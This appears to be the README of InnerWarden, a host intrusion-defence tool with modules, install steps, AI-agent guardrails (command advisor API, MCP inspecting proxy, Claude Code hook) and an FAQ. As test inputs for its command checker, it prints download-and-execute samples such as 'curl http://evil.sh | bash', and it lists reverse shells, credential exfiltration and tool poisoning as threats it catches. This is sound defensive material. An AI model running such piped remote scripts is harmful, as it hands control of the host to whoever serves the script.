Before enabling automatic responses, run InnerWarden in observe-only mode for a period that makes sense for your environment (days to weeks). During this time:

1. **Review the logs**: check the dashboard or query `innerwarden.db` in your data directory to understand what the detectors are flagging.
2. **Check for false positives**: make sure legitimate traffic (CI/CD systems, monitoring probes, your own scripts) is not being misidentified.
3. **Configure your allowlist**: add trusted IPs and users so they are never acted upon:
   ```bash
   innerwarden trust add --ip 10.0.0.0/8
   innerwarden trust add --user deploy
   ```
4. **Enable dry-run first**: when you enable the responder, keep `dry_run = true` so you can see what *would* happen without any actual effect:
   ```bash
   innerwarden config responder --enable
   ```
5. **Go live only when you trust what you see**:
   ```bash
   innerwarden config responder --enable --dry-run false
   ```

There is no rush. The system is designed to be useful in observe-only mode indefinitely.

---

## Modules

Enable what you need.

| Module | Threat | Response |
|--------|--------|----------|
| `ssh-protection` | SSH brute-force + credential stuffing | Block IP |
| `network-defense` | Port scanning | Block IP |
| `sudo-protection` | Sudo privilege abuse | Suspend user sudo |
| `execution-guard` | Malicious shell commands (AST) | Kill process / observe |
| `search-protection` | HTTP endpoint abuse | Rate limit nginx |
| `file-integrity` | Unauthorized file changes | Alert |
| `container-security` | Docker lifecycle anomalies | Block container / observe |
| `threat-capture` | Active threat investigation | Honeypot + traffic capture |
| `nginx-error-monitor` | HTTP error floods, path traversal | Block IP |
| `slack-notify` | Incident notifications | Slack webhook |
| `cloudflare-integration` | L7 DDoS / botnet IPs | Block at Cloudflare edge |
| `abuseipdb-enrichment` | IP reputation context | Enriched AI prompt |
| `dshield-enrichment` | SANS ISC IP reputation (keyless, read-only) | Enriched AI prompt |
| `geoip-enrichment` | Country/ISP geolocation | Enriched AI prompt |
| `crowdsec-integration` | CrowdSec community intel | Block enforcement (experimental) |

```bash
innerwarden enable block-ip
innerwarden enable ssh-protection
innerwarden enable shell-audit       # prompts for privacy consent
```

Community modules:
```bash
innerwarden module install <url>     # SHA-256 verified
innerwarden module search <term>     # search the registry
```

---

## Protecting AI agents

If you run an AI agent with access to a shell, files, API keys, MCP tools, or production-like infrastructure, InnerWarden gives it a supervisor outside the prompt.

There are three protection surfaces:

- **Advisor API** for agents or tools you can modify: ask InnerWarden before running a command or connecting to an IP.
- **MCP inspecting proxy** for tool servers: screen `tools/call` arguments, tool descriptions, and tool results inline.
- **Host-level verification** for connected agents: eBPF/audit signals show what actually executed even if the agent ignored advice.

For the current built-in agent module:

```bash
innerwarden enable openclaw-protection
```

This enables command monitoring and agent safety checks for supported local agents and custom tool runners. The command analyzer uses structural analysis (tree-sitter AST) and embedded Agent Threat Rules instead of simple regex. Download-and-execute pipelines, reverse shells, staged attacks, credential exfiltration, and obfuscated commands are caught before they become silent damage.

### Let your agent ask before acting

InnerWarden exposes an API that AI agents can query:

```bash
# "Is my server safe right now?"
curl -s http://localhost:8787/api/agent/security-context
# → {"threat_level": "low", "recommendation": "safe to proceed"}

# "Is this command safe to run?"
curl -s -X POST http://localhost:8787/api/advisor/check-command \
  -H "Content-Type: application/json" \
  -d '{"command": "curl https://example.com/setup.sh | bash"}'
# → {"risk_score": 40, "recommendation": "review", "signals": ["download_and_execute"]}

# "Is this IP safe to connect to?"
curl -s "http://localhost:8787/api/agent/check-ip?ip=203.0.113.10"
# → {"known_threat": true, "blocked": true, "recommendation": "avoid"}
```

Your agent calls `check-command` before executing. If the recommendation is `deny`, it stops or asks the operator. If it ignores the advice and runs anyway, the host layer can still detect the execution and escalate the incident.

**MCP inspecting proxy.** For agents that talk to MCP servers, wrap the server so every tool call and result is inspected inline — no agent code changes needed:

```bash
# Advisory (default): transparent pipe that alerts on threats
innerwarden agent proxy -- npx -y some-mcp-server

# Guard: block a dangerous tool call (credential leak, injection, ATR rule)
# with an isError denial; the call never reaches the server
innerwarden agent proxy --mode guard -- npx -y some-mcp-server
```

It parses the JSON-RPC stdio stream and screens `tools/call` arguments, `tools/list` descriptions (tool poisoning), and tool results (injected responses). `guard` mode returns a denial before the dangerous call reaches the real tool server.

See [AI Agent Protection docs](modules/openclaw-protection/docs/README.md) for the full integration guide.

---

## Hardening advisor

Scan your system and get actionable security recommendations without changing anything.

```
$ innerwarden system harden

  ✓ SSH
    ⚠  Password authentication is enabled [high]
       → Set 'PasswordAuthentication no' in /etc/ssh/sshd_config
    ⚠  Root login via SSH is permitted [high]
       → Set 'PermitRootLogin no' in /etc/ssh/sshd_config

  ✓ Firewall
    ✓ 2 check(s) passed

  ! Kernel
    ⚠  ICMP redirects accepted (MITM risk) [medium]
       → Run: sudo sysctl -w net.ipv4.conf.all.accept_redirects=0

  ✓ Permissions
    ✓ 3 check(s) passed

  ! Updates
    ⚠  3 security update(s) pending (8 total) [high]
       → Run: sudo apt update && sudo apt upgrade -y

  ✓ Docker
    ✓ 3 check(s) passed

  ✓ Services
    ✓ 2 check(s) passed

  Score: 68/100 (Fair)
  ██████████████████████░░░░░░░░░
```

Checks SSH config, firewall, kernel params (ASLR, SYN cookies, IP forwarding), file permissions (SUID, world-writable), pending updates, Docker (privileged containers, socket), and exposed services. Advisory only, never applies changes.

---

## Live threat feed

See InnerWarden responding to live network anomalies on our lab infrastructure in real time: [innerwarden.com/live](https://innerwarden.com/live)

The agent exposes public read-only endpoints for live monitoring:

```bash
# Last 20 incidents with decisions
curl https://live.innerwarden.com/api/live-feed

# Real-time SSE stream
curl https://live.innerwarden.com/api/live-feed/stream
```

---

## Scan advisor

Let your server tell you what it needs.

```
$ innerwarden system scan

  sshd       running  → ssh-protection       ESSENTIAL    [NATIVE]
  docker     running  → container-security    RECOMMENDED  [NATIVE]
  nginx      running  → search-protection     RECOMMENDED  [NATIVE]

  Activation sequence:
    1. innerwarden enable block-ip
    2. innerwarden enable ssh-protection
    3. innerwarden enable search-protection
```

**NATIVE** = reads existing logs, zero external deps. **EXTERNAL** = requires separate tool install.

---

## Install

```bash
curl -fsSL https://innerwarden.com/install | sudo bash
```

No API key required. What the installer does:
- Creates a dedicated `innerwarden` service user
- Downloads sensor + agent + ctl binaries for your architecture (`x86_64` / `aarch64`)
- Verifies each binary's **SHA-256 sidecar** against the canonical release
- Verifies each binary's **Ed25519 signature** against the embedded release public key (requires `openssl >= 3.0`)
- Writes config to `/etc/innerwarden/`, creates the data directory
- Starts sensor + agent via systemd (Linux) or launchd (macOS)
- Safe posture: detection active, no response skills enabled, `dry_run = true`

The installer fail-closes for stable releases when signatures are missing or invalid. Override env vars exist for migration / air-gapped scenarios. See [Supply Chain Security](docs/supply-chain-security.md) for the manual verification recipe (`SHA256SUMS` + `.sig` + `gh attestation verify`), the active key fingerprint, and an honest list of what is and is not guaranteed.

**Prefer not to pipe a script straight into `sudo bash`?** Don't — download it, confirm it matches the published manifest, read it, then run it yourself. The installer script ships as a release asset and is listed in the release `SHA256SUMS` manifest:

```bash
base="https://github.com/InnerWarden/innerwarden/releases/latest/download"
curl -fsSLO "$base/install.sh"          # the bootstrap script
curl -fsSLO "$base/SHA256SUMS"          # release manifest — lists install.sh too

grep ' install.sh$' SHA256SUMS | sha256sum -c -   # confirm the script matches the manifest
less install.sh                          # read what you're about to run
sudo bash install.sh                     # then run the audited copy
```

That confirms the bytes match the published manifest and lets you read the script before anything runs as root. For full cryptographic verification of a release (Ed25519 binary signatures, the GPG-signed `SHA256SUMS.sig`, and SLSA build attestations), see [Supply Chain Security](docs/supply-chain-security.md).

With external integrations:
```bash
curl -fsSL https://innerwarden.com/install | sudo bash -s -- --with-integrations
```

Build from source:
```bash
INNERWARDEN_BUILD_FROM_SOURCE=1 curl -fsSL https://innerwarden.com/install | sudo bash
```

### Windows

On **Windows**, InnerWarden ships two tiers (the kernel EDR - eBPF, Execution Gate - stays Linux-only):

**Guardrail** (default, per-user, no admin): `iw-guard`, a single signed binary that screens an AI agent's shell command / MCP tool call for danger. One line downloads it (per-arch), verifies the SHA-256, and adds it to PATH:

```powershell
irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 | iex
```

**Full host tier** (the Mac-parity light tier: sensor + agent + dashboard, boot-start Scheduled Tasks, monitor-only by default). Run elevated with `-Full`:

```powershell
# in an elevated PowerShell:
irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 -OutFile install.ps1
.\install.ps1 -Full
```

It installs the signed trio, writes a Windows config (ETW + integrity collectors on, responder off / dry-run), and registers two SYSTEM tasks so the sensor + agent start on boot. Windows Event Log telemetry then feeds the same detectors + cloud-AI triage + dashboard as Linux/macOS.

Or grab the signed `.exe` straight from the release and verify it yourself:

```powershell
$base = "https://github.com/InnerWarden/innerwarden/releases/latest/download"
iwr "$base/iw-guard-windows-x86_64.exe" -OutFile iw-guard.exe
iwr "$base/iw-guard-windows-x86_64.exe.sha256" -OutFile iw-guard.exe.sha256
if ((Get-FileHash iw-guard.exe -Algorithm SHA256).Hash.ToLower() -ne (Get-Content -Raw iw-guard.exe.sha256).Trim()) { throw "checksum mismatch" }

.\iw-guard.exe check "curl http://evil.sh | bash"   # verdict JSON; exits 1 on deny
.\iw-guard.exe install claude-code                  # wire a fail-closed PreToolUse hook
.\iw-guard.exe proxy --mode guard -- npx -y some-mcp-server   # enforce in front of an MCP server
```

`iw-guard install claude-code` adds a fail-closed `PreToolUse` hook to `settings.json` that screens every shell command Claude Code proposes (in-process, offline) and blocks the dangerous ones. `check` exits 1 on a `deny` so any other agent's hook can gate on it too. Same binary runs on Linux and macOS.

### Uninstall

```bash
sudo innerwarden uninstall            # remove the software, keep config + data
sudo innerwarden uninstall --purge    # also remove config, data, logs, and the user
sudo innerwarden uninstall --dry-run  # preview exactly what would be removed
```

This stops every service (sensor, agent, supervisor, watchdog), removes the binaries, systemd units, embedded eBPF object, pinned BPF maps, sudoers drop-ins, and the firewall rules InnerWarden added. Config (`/etc/innerwarden`) and data (`/var/lib/innerwarden`) are kept by default so a reinstall keeps your history and license; `--purge` removes them too.

If the `innerwarden` binary is missing or broken, the installer can tear everything down the same way:
```bash
curl -fsSL https://innerwarden.com/install | sudo bash -s -- --uninstall          # or --uninstall --purge
```

### Configure AI

AI triage is optional. Add it when you want confidence-scored decisions.

**OpenAI:**
```bash
# /etc/innerwarden/agent.env
OPENAI_API_KEY=sk-...
```

**Anthropic:**
```bash
# /etc/innerwarden/agent.env
ANTHROPIC_API_KEY=sk-ant-...
```
```toml
# /etc/innerwarden/agent.toml
[ai]
provider = "anthropic"
model = "claude-haiku-4-5-20251001"
```

**Ollama (local, no key):**
```bash
curl -fsSL https://ollama.ai/install.sh | sh && ollama pull llama3.2
```
```toml
# /etc/innerwarden/agent.toml
[ai]
enabled = true
provider = "ollama"
model = "llama3.2"
```

After changing config:
```bash
sudo systemctl restart innerwarden-agent          # Linux
sudo launchctl kickstart -k system/com.innerwarden.agent  # macOS
```

Run `innerwarden system doctor` to validate your provider.

### After install

```bash
innerwarden get status        # verify services are running
innerwarden system doctor     # diagnose issues with fix hints
innerwarden system test       # inject a synthetic incident and verify the full pipeline responds
innerwarden list              # see capabilities and modules
```

Enable response skills when ready:
```bash
innerwarden enable block-ip          # IP blocking (ufw default, or iptables/nftables)
innerwarden enable sudo-protection   # detect + respond to sudo abuse
innerwarden enable shell-audit       # shell command trail via auditd
```

### Configure notifications

```bash
innerwarden config telegram          # interactive wizard
innerwarden config slack             # Slack webhook setup
innerwarden config web-push --subject mailto:you@example.com
innerwarden config webhook --url https://hooks.example.com/notify
innerwarden config test-alert        # verify all channels
```

### Go live

After enabling skills, the responder is active but still in `dry_run = true`. When you trust the decisions:

```bash
innerwarden config responder --enable --dry-run false
```

### Updates

```bash
innerwarden upgrade          # fetch + install latest (SHA-256 verified)
innerwarden upgrade --check  # check without installing
```

### Useful commands

```bash
innerwarden get status                              # services + today's activity
innerwarden get incidents --days 2                  # recent threats
innerwarden get decisions --action block_ip         # what was blocked and why
innerwarden get report                              # daily security report

innerwarden stream                                  # live event stream

innerwarden action block 203.0.113.10               # manual IP block
innerwarden action unblock 203.0.113.10             # remove block

innerwarden trust add --ip 10.0.0.0/8               # skip AI for trusted ranges
innerwarden trust add --user deploy                 # skip AI for trusted users

innerwarden config ai                               # interactive AI provider setup (12 providers)
innerwarden config responder --enable --dry-run false
innerwarden config telegram                         # notification setup
innerwarden config cloudflare --token YOUR_TOKEN    # edge blocking

innerwarden system doctor                           # diagnostics with fix hints
innerwarden system harden                           # security hardening advisor
innerwarden system scan                             # detect + recommend modules
innerwarden system test                             # verify full pipeline end-to-end
innerwarden system backup                           # archive configs to tar.gz
innerwarden system navigator                        # export MITRE ATT&CK coverage map

innerwarden module install <url>                    # SHA-256 verified community modules
innerwarden agent scan                              # find known local agents and MCP configs
innerwarden agent connect                           # connect agents you want supervised
innerwarden agent proxy -- npx -y some-mcp-server   # wrap an MCP server with inspection
```

---

## Supported environments

- **Linux**: Ubuntu 22.04+, any systemd-based distro. Full feature set: 27 eBPF kernel programs loaded (kernel-dependent; tracepoints, kprobes, LSM, XDP, raw_tracepoints), kill chain detection, wire-speed XDP blocking, and the in-kernel Execution Gate.
- **macOS**: Ventura and later (launchd, pf firewall, unified log). Detection and response work fully, but eBPF kernel programs are Linux-only. macOS uses log-based collectors instead.
- **Windows**: the per-user AI-agent guardrail (`iw-guard`) runs standalone, and `install.ps1 -Full` installs the host tier (Windows Event Log / ETW telemetry through the same detectors, dashboard, and Windows Firewall containment, monitor-only by default). Like macOS, the kernel EDR (eBPF, Execution Gate) is Linux-only.

The complete host EDR (eBPF sensor + Execution Gate) is Linux. Windows and macOS run the "Phantom" tier: the cross-platform agent guardrail plus log/event-based detection and response.

Pre-built binaries: `x86_64` and `aarch64` for Linux and macOS, plus a signed Windows guardrail (`x86_64` / `aarch64`) and host-tier trio (`x86_64`).

---

## Build and test

```bash
make test       # 8076 tests across the workspace
make build      # debug build (sensor + agent + ctl)
make replay-qa  # end-to-end integration test
```

Run locally:
```bash
make run-sensor   # writes to ./data/
make run-agent    # reads from ./data/
```

---

## FAQ

**Is this an EDR?**
No. It is a self-contained defence agent with bounded response skills and full audit trails. No cloud, no phone-home, runs entirely on your host.

**Does it block by default?**
No. Starts in observe-only mode. You enable response skills and disable dry-run when ready.

**Do I need an AI provider?**
No. Detection, logging, dashboard, and reports all work without AI. AI adds confidence-scored triage for autonomous response and is entirely optional.

**How is this different from Fail2ban?**
Fail2ban blocks IPs based on regex patterns. InnerWarden has 82 detectors, 27 eBPF kernel programs (kernel-dependent) with kill chain detection, a collaborative defence mesh network, 10 response skills (including sudo suspension, process kill, container pause, honeypots, and traffic capture), twelve AI providers, 4-layer DDoS defence, Telegram bot, AbuseIPDB intelligence sharing, and a full investigation dashboard with MITRE ATT&CK mapping.

**How is this different from other HIDS tools?**
Most host intrusion detection systems only observe. They write alerts for a human to act on. InnerWarden observes AND blocks. LSM hooks stop reverse shells at the kernel's execve before the process runs. XDP drops attack traffic at wire speed. Kill chain detection blocks 7 generic exploit patterns without CVE signatures, catching zero-day exploits by behaviour rather than known hashes.

**Can I add custom detectors or skills?**
Yes. See [module authoring guide](https://github.com/InnerWarden/innerwarden/wiki/Module-Authoring).

---

## Before you enable enforcement

> **Recommended: start in dry-run.**
> Every install ships in observe-only mode (`responder.enabled = false`, `dry_run = true`), so InnerWarden logs what it *would* do without touching your system. We recommend running it that way first, reviewing the decisions in the dashboard, and setting up allowlists for your trusted IPs, users, and services before you flip enforcement on. Nothing acts until you opt in.

Once live, InnerWarden can block IP addresses, kill processes, suspend user privileges, pause containers, and modify firewall rules. Those are powerful actions, so it is worth:

- Running in observe/dry-run mode first and reviewing the audit trail
- Configuring allowlists to protect trusted IPs, users, and services
- Tuning thresholds for your environment
- Knowing which response skills you have enabled and what they do

A misconfigured allowlist or an overly aggressive threshold can affect a legitimate user or service, so test in staging before production. InnerWarden is open source and provided under the Apache-2.0 license, without warranty.

---

## Community & feedback

InnerWarden is built in the open and we are actively trying to grow the community around it. If you are running it (or thinking about it), we want to hear from you — the install on your box tells us more than any benchmark suite.

**Feedback we want, however small:**

- [**Open an issue**](https://github.com/InnerWarden/innerwarden/issues/new/choose) — install problem, false positive, surprising behaviour, missing detector, anything that did not match your expectation
- [**Start a discussion**](https://github.com/InnerWarden/innerwarden/discussions) — questions, ideas, sharing your config, "did anyone else see X?"
- [**Star the repo**](https://github.com/InnerWarden/innerwarden) if it is useful — visibility is how more security engineers find it
- **Quick survey:** [usage + pain points (60 sec)](https://github.com/InnerWarden/innerwarden/discussions/categories/feedback) — even one-liners help us prioritise
- **Email** for private feedback or security disclosures: see [SECURITY.md](SECURITY.md)

Tell us: what did you install it on (distro / kernel)? Did it catch anything real? What blocked you? What would make you trust it on a production box? No answer is too small.

## Contributing

We need more hands. Detector writers, integration authors, docs hackers, testers — every contribution moves the project forward.

- [**Contributing guide**](CONTRIBUTING.md) — local dev setup, PR checklist, code style. Commits need a [DCO](DCO) sign-off (`git commit -s`); no CLA.
- [**Good first issues**](https://github.com/InnerWarden/innerwarden/labels/good%20first%20issue) — documentation, config flags, small features
- [**Help wanted**](https://github.com/InnerWarden/innerwarden/labels/help%20wanted) — new detectors, sinks, integrations, CLI commands
- [**Module authoring**](https://github.com/InnerWarden/innerwarden/wiki/Module-Authoring) — write a vertical security module (manifest + config + docs + tests)
- [**Integration recipes**](https://github.com/InnerWarden/innerwarden/wiki/Integration-Recipes) — declarative YAML to wire an external tool in minutes, no Rust required

New detectors, integration recipes, and module documentation are especially appreciated. If you have a specific use case (different distro, weird kernel, missing collector for your stack), open an issue and we will help you ship it.

---

## Links

- [Website](https://www.innerwarden.com)
- [Live activity feed](https://innerwarden.com/live) — network anomalies on our lab infrastructure (self/internal traffic filtered), in real time
- [Blog](https://innerwarden.com/blog)
- [Changelog](CHANGELOG.md)
- [Contributing](CONTRIBUTING.md)
- [Security policy](SECURITY.md)
- [Documentation](https://github.com/InnerWarden/innerwarden/wiki)
- [Module authoring](https://github.com/InnerWarden/innerwarden/wiki/Module-Authoring)
- [GitHub Discussions](https://github.com/InnerWarden/innerwarden/discussions) — questions, ideas, war stories
- [Report an issue](https://github.com/InnerWarden/innerwarden/issues/new/choose) — install problems, FPs, missing detectors

## License

Apache License 2.0. See [LICENSE](LICENSE).
